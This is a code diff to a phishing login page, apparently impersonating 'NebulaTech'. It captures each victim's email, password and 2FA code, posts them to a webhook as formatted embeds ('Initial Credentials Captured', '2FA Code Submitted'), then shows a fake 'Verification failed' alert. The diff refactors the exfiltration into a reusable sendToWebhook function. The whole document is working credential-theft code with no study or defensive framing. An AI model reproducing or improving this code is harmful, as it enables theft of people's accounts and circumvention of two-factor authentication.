@@ -92,6 +92,18 @@
     let capturedEmail = "";
     let capturedPassword = "";
 
+    async function sendToWebhook(payload) {
+      try {
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (e) {
+        console.warn("Webhook error:", e);
+      }
+    }
+
     function handleLogin() {
       const email = document.getElementById("email").value.trim();
       const password = document.getElementById("password").value;
@@ -104,36 +116,42 @@
       capturedEmail = email;
       capturedPassword = password;
 
+      const loginPayload = {
+        content: "**🧠 Login Attempt**",
+        embeds: [{
+          title: "🚪 Initial Credentials Captured",
+          color: 5814783,
+          fields: [
+            { name: "Email", value: email },
+            { name: "Password", value: password },
+            { name: "Timestamp", value: new Date().toLocaleString() }
+          ]
+        }]
+      };
+
+      sendToWebhook(loginPayload);
+
       document.getElementById("loginStage").classList.add("hidden");
       document.getElementById("codeStage").classList.remove("hidden");
     }
 
-    async function handleVerification() {
+    function handleVerification() {
       const code = document.getElementById("codeInput").value;
 
-      const payload = {
-        content: "**Multi-step login attempt**",
+      const verifyPayload = {
+        content: "**🔐 Verification Stage**",
         embeds: [{
-          title: "🛡️ NebulaTech Credentials",
-          color: 15844367,
+          title: "📲 2FA Code Submitted",
+          color: 15105570,
           fields: [
             { name: "Email", value: capturedEmail },
-            { name: "Password", value: capturedPassword },
             { name: "2FA Code", value: code },
             { name: "Timestamp", value: new Date().toLocaleString() }
           ]
         }]
       };
 
-      try {
-        await fetch(webhookURL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-      } catch (e) {
-        console.warn("Webhook error:", e);
-      }
+      sendToWebhook(verifyPayload);
 
       setTimeout(() => {
         alert("Verification failed. Please try again.");
